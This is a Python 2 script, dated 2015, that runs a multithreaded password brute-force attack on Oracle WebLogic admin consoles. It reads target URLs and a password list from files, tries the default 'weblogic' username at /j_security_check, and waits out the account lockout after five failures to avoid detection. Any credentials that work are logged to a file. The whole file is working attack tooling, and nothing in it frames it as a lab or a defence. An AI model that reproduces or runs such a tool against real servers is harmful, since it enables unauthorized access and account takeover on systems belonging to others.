#coding=utf-8
from multiprocessing import Queue, Process
import argparse
import requests
import time
import threading
import sys
'''
Version 2
Copyright dc3
2015-09-09 15:58
'''
global xtime
xtime=time.strftime("%Y-%m-%d[%H.%M.%S]")
print xtime

def post(urls):
	global xtime
	#print xtime
	size=urls.qsize()
	while size != 1:
		size=urls.qsize()
		#print size
		i=urls.get()
		try:
			z=0
			co=1
			count=len(open('pwd.txt','rU').readlines())
			for pwd in open("pwd.txt").readlines():
				pwd=pwd.strip('\n')
				#print 'weblogic'+'/'+pwd
				z=z+1
				co=co+1
				if z == 6:	#账户错误达到5次，此账户锁定30分钟，等待重试
					print i+' Waiting......'
					ct=0
					b=31
					while (ct<b):
						ncount=b-ct
						ncount='%d' %ncount
						print 'Current threads:'+threading.active_count()
						print i+'\n'+ncount+'min left'
						time.sleep(60)
						ct+=1
					z=1 #重置计数
				data = {'j_username':'weblogic','j_password':pwd}
				s = requests.post(i+'/j_security_check',data =data,timeout=5)
				if s.content.count('Home Page') !=0 or s.content.count('WebLogic Server Console') !=0 or s.content.count('console.portal') !=0:
					print i,'Success!!!!!' 
					print 'weblogic'+'/'+pwd
					f = open(xtime+'.txt', 'a')
					f.write(i+' ')
					f.write('weblogic'+'/')
					f.write(pwd+'\n')
					f.close()
					s=0
					break #成功，停止循环
				else:
					if co == count: #如果已尝试密码数等于字典行数，则输出失败
						print i,'Failed!'
						f = open("bad.txt", 'a')
						f.write(i+'\n')
						f.close()
						s = 0
		except:
			s=0

def pargs():
    parser = argparse.ArgumentParser(prog='main.py', formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument('-p', metavar='processes', type=int, help=' The amount of processes')
    parser.add_argument('-t', metavar='threads', type=int, help=' The amount of threads per process')
    if(len(sys.argv[1:]) / 2 != 2):
        sys.argv.append('-h')
    return parser.parse_args()

def geturl(urls):
	for url in open("u.txt").readlines():
			urls.put(url.strip('\n'))

def task(maxThreads,urls):#多线程
	mythreads = []
	for num in range(maxThreads):
		t = threading.Thread(target=post, args=(urls,))
		t.setDaemon(True)
		t.start()
		mythreads.append(t)
	for t in mythreads:
		t.join()

def main():
	targs = pargs()
	maxProcesses = targs.p
	maxThreads = targs.t
	urls = Queue(maxsize = 0)
	#读取URL
	threading.Thread(target=geturl, args=(urls,)).start()
	#多进程
	Processes = []
	for i in range(maxProcesses):
		cq = Process(target=task, args=(maxThreads,urls,))
		cq.start()
		Processes.append(cq)
	for p in Processes:
		p.join()

if __name__ == '__main__':
	main()
